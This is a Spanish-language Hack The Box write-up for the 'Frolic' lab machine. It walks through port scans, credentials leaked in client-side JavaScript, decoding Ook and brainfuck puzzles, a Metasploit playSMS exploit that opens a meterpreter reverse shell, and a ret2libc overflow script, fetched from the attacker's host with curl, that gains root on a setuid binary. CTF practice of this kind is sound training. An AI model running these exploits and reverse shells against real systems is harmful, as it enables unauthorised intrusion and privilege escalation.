@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Frolic :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Frolic     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.111   Maker felamos      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6,3.3,5,5,6.7] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/frolic/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Frolic :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Frolic     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.111   Maker felamos      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6,3.3,5,5,6.7] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/frolic/Screenshot%20from%202019-03-22%2019-45-07.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Frolic :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Frolic     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.111   Maker felamos      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6,3.3,5,5,6.7] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/frolic/" />
+<meta property="og:site_name" content="Hack The Box - Frolic" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/frolic/Screenshot%20from%202019-03-22%2019-45-07.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-03-24 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/frolic/">Hack The Box - Frolic</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Sunday, Mar 24, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/masscan/">masscan</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/samba/">samba</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/ook-language/">ook-language</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/brainfuck-language/">brainfuck-language</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/writeup/">writeup</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/frolic/../../image/htb/frolic/Screenshot%20from%202019-03-22%2019-45-07.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Frolic</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>20</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Facil</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.111</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/27390">felamos</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="200" height="100"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [6,3.3,5,5,6.7]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [6,5,7,3,5]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<h2 id="masscan">Masscan</h2>
+
+<p>Realizamos un escaneo de puertos udp y tcp con masscan.</p>
+
+<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.111 --rate=1000 -e tun0
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 139/tcp on 10.10.10.111                                   
+Discovered open port 9999/tcp on 10.10.10.111
+</code></pre>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneando el servicio que corre en los puertos encontrados con masscan.</p>
+
+<pre><code class="language-bash">Starting Nmap 7.70 ( https://nmap.org )
+Nmap scan report for 10.10.10.111
+Host is up (1.0s latency).
+
+PORT     STATE SERVICE     VERSION
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds
+</code></pre>
+
+<hr />
+
+<h2 id="samba">SAMBA</h2>
+
+<p>Un escaneo de puntos compartidos con smbclient, no encontramos mucho que nos pudiese ayudar.</p>
+
+<pre><code class="language-bash">root@sckull:~# smbclient -L 10.10.10.111
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            FRIENDZONE
+</code></pre>
+
+<hr />
+
+<h2 id="http">HTTP</h2>
+
+<p>Un escaneo de rutas y archivos con gobuster al puerto 9999.</p>
+
+<pre><code class="language-bash">root@sckull:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.111:9999/ -q -np -x php,html,txt,js -t 15
+/admin (Status: 301)
+/backup (Status: 301)
+/dev (Status: 301)
+/test (Status: 301)
+/playsms (Status: 301)
+</code></pre>
+
+<p>Dentro de la ruta /admin encontramos un panel de administracion que necesita un usuario y contraseña
+<img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-06-04.png" alt="image" /></p>
+
+<p>En /backup encontramos password.txt y user.txt que contienen una contraseña y usuario respectivamente:</p>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-07-02.png" alt="image" /></p>
+
+<pre><code class="language-text">passsword.txt -&gt; password - imnothuman
+user.txt -&gt; user - admin
+</code></pre>
+
+<p>En la ruta /dev y /loop no encontramos nada, dentro de /test informacion de la version de php corriendo en la maquina.
+<img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-09-07.png" alt="image" /></p>
+
+<p>Finalmente en /playsms encontramos un login:
+<img src="../../image/htb/frolic/Screenshot from 2019-03-22 19-00-46.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="admin">/admin</h2>
+
+<p>Analizando el codigo de la ruta /admin encontramos que contiene un archivo de javascript llamado login.js:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Crack me :|&lt;/title&gt;
+&lt;!-- Include CSS File Here --&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;
+&lt;!-- Include JS File Here --&gt;
+&lt;script src=&quot;js/login.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;div class=&quot;main&quot;&gt;
+&lt;h2&gt;c'mon i m hackable&lt;/h2&gt;
+&lt;form id=&quot;form_id&quot; method=&quot;post&quot; name=&quot;myform&quot;&gt;
+&lt;label&gt;User Name :&lt;/label&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;/&gt;
+&lt;label&gt;Password :&lt;/label&gt;
+&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot;/&gt;
+&lt;input type=&quot;button&quot; value=&quot;Login&quot; id=&quot;submit&quot; onclick=&quot;validate()&quot;/&gt;
+&lt;/form&gt;
+&lt;span&gt;&lt;b class=&quot;note&quot;&gt;Note : Nothing&lt;/b&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Y dentro de login.js encontramos una condicional que contiene un usuario y contraseña, tambien una redireccion hacia success.html:</p>
+
+<pre><code class="language-text">usuario: admin
+contraseña: superduperlooperpassword_lol
+</code></pre>
+
+<pre><code class="language-javascript">var attempt = 3; // Variable to count number of attempts.
+// Below function Executes on click of login button.
+function validate(){
+var username = document.getElementById(&quot;username&quot;).value;
+var password = document.getElementById(&quot;password&quot;).value;
+if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){
+alert (&quot;Login successfully&quot;);
+window.location = &quot;success.html&quot;; // Redirecting to other page.
+return false;
+}
+else{
+attempt --;// Decrementing by one.
+alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;);
+// Disabling fields after 3 attempts.
+if( attempt == 0){
+document.getElementById(&quot;username&quot;).disabled = true;
+document.getElementById(&quot;password&quot;).disabled = true;
+document.getElementById(&quot;submit&quot;).disabled = true;
+return false;
+}
+}
+}
+</code></pre>
+
+<p>Dentro de success.html encontramos caracteres extraños:</p>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-13-25.png" alt="image" /></p>
+
+<pre><code class="language-text">..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
+</code></pre>
+
+<p>Utilizando la pagina <a href="https://www.dcode.fr/ook-language"><strong>dcode.fr/ook-language</strong></a> para decodificar lo anterior:</p>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-16-13.png" alt="image" /></p>
+
+<p>Nos muestra el mensaje: &lsquo;Nothing here check /asdiSIAJJ0QWE9JAS&rsquo; por lo que podria ser una ruta dentro de la pagina al visitar dicha ruta nos encontramos con lo siguiente:</p>
+
+<pre><code class="language-vim">UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
+BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
+K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
+EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
+lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
+AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
+AAAAAAEAAQBPAAAAAwEAAAAA
+</code></pre>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-18-44.png" alt="image" /></p>
+
+<p>En este caso un archivo codificado en base64 y lo agregamos a un nuevo archivo, verificamos que tipo de archivo es con &lsquo;file&rsquo; y vemos que el archivo decodificado (file_decode) es un archivo zip por lo que le cambiamos el nombre y le agregamos &lsquo;.zip&rsquo; al final:</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/frolic# echo &quot;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA&quot; | base64 -d &gt; file.txt
+root@sckull:~/htb/frolic# file file.txt 
+file.txt: Zip archive data, at least v2.0 to extract
+root@sckull:~/htb/frolic# 
+root@sckull:~/htb/frolic# mv file.txt file.zip
+</code></pre>
+
+<p>Luego al intentar descomprimir el archivo file.zip nos pide una contraseña, en este caso la contraseña es &lsquo;password&rsquo; (contraseñas comunes), nos devuelve un archivo index.php.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/frolic# 7z x file.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 
+Scanning the drive for archives:
+1 file, 360 bytes (1 KiB)
+
+Extracting archive: file.zip
+--
+Path = file.zip
+Type = zip
+Physical Size = 360
+    
+Enter password (will not be echoed):password
+Everything is Ok
+
+Size:       617
+Compressed: 360
+root@sckull:~/htb/frolic# ls
+file.zip  index.php
+</code></pre>
+
+<p>En el interior de index.php nos encontramos con texto en HEX al pasarlo a texto nos devuelve otra vez un texto en base64:</p>
+
+<pre><code class="language-vim">4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+</code></pre>
+
+<pre><code class="language-bash">root@sckull:~/htb/frolic# echo 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a | xxd -r -p
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
+KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
+K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
+</code></pre>
+
+<p>Al decodificar el texto en base64 nos devuelve texto en lenguaje &lsquo;brainfuck&rsquo;:</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/frolic# echo KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d
++++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+
+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---
+&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;
+++..&lt; 
+root@sckull:~/htb/frolic#
+</code></pre>
+
+<p>Decodificando el mensaje con <a href="https://www.dcode.fr/brainfuck-language"><strong>dcode.fr/brainfuck-language</strong></a>:</p>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 18-34-55.png" alt="image" /></p>
+
+<p>Intentamos utilizar idkwhatispass como contraseña en /playsms y el usuario admin y nos logramos logear dentro de la plataforma.</p>
+
+<p><img src="../../image/htb/frolic/Screenshot from 2019-03-22 19-02-44.png" alt="image" /></p>
+
+<p>Para esta plataforma (playsms) encontramos un exploit (exploit/multi/http/playsms_uploadcsv_exec) dentro de metasploit y lo utilizamos con las credenciales que habiamos encontrado.</p>
+
+<pre><code class="language-bash">msf5 &gt; use exploit/multi/http/playsms_uploadcsv_exec
+msf5 exploit(multi/http/playsms_uploadcsv_exec) &gt; show options 
+
+Module options (exploit/multi/http/playsms_uploadcsv_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   idkwhatispass    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.111     yes       The target address range or CIDR identifier
+   RPORT      9999             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /playsms         yes       Base playsms directory path
+   USERNAME   admin            yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.X.X      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PlaySMS 1.4
+
+msf5 exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.X.X:4444 
+[+] Authentication successful: admin:idkwhatispass
+[*] Sending stage (38247 bytes) to 10.10.10.111
+[*] Meterpreter session 1 opened (10.10.X.X:4444 -&gt; 10.10.10.111:33574)
+
+meterpreter &gt; shell
+Process 1765 created.
+Channel 0 created.
+cd /home/ayush
+ls
+user.txt
+cat user.txt
+2ab95909cf509f85a6f476b59a0c2fe0
+</code></pre>
+
+<p>Obtenemos nuestra bandera &lsquo;user.txt&rsquo;.</p>
+
+<hr />
+
+<h2 id="privilege-escalation-b0f">PRIVILEGE ESCALATION - b0f</h2>
+
+<p>En los archivos de ayush encontramos un archivo llamado .rop que tiene permisos del usuario root.</p>
+
+<pre><code class="language-bash">www-data@frolic:/home/ayush/.binary$ ls -lah
+ls -lah
+total 16K
+drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 .
+drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 ..
+-rwsr-xr-x 1 root  root  7.4K Sep 25 00:59 rop
+www-data@frolic:/home/ayush/.binary$
+</code></pre>
+
+<p>Utilizando el siguiente script obtenemos privilegios root y nuestra bandera &lsquo;root.txt&rsquo;.</p>
+
+<pre><code class="language-python">from struct import pack
+from subprocess import call
+
+system = 0xb7e19000 + 0x0003ada0
+exit = 0xb7e19000 + 0x0002e9d0
+binsh = 0xb7e19000 + 0x0015ba0b
+
+def p32(num):
+     return pack(&quot;&lt;I&quot;,num)
+
+buf = &quot;A&quot;*52
+buf += p32(system)
+buf += p32(exit)
+buf += p32(binsh)
+
+call([&quot;/home/ayush/.binary/rop&quot;, buf])
+</code></pre>
+
+<pre><code class="language-bash">www-data@frolic:/tmp$ curl 10.10.15.46:80/bf.py -o bf.py
+www-data@frolic:/tmp$ ls
+ls
+bf.py
+www-data@frolic:/tmp$ python bf.py
+python bf.py
+# whoami; id; wc -c /root/root.txt; cat /root/root.txt
+whoami; id; wc -c /root/root.txt; cat /root/root.txt
+root
+uid=0(root) gid=33(www-data) groups=33(www-data)
+33 /root/root.txt
+85d3fdf03f969892538ba9a731826222
+# 
+</code></pre>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://sckull.github.io/posts/curling/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Hack The Box - Curling</span>
+              </a>
+            </span>
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/access/">
+                <span class="button__text">Hack The Box - Access</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
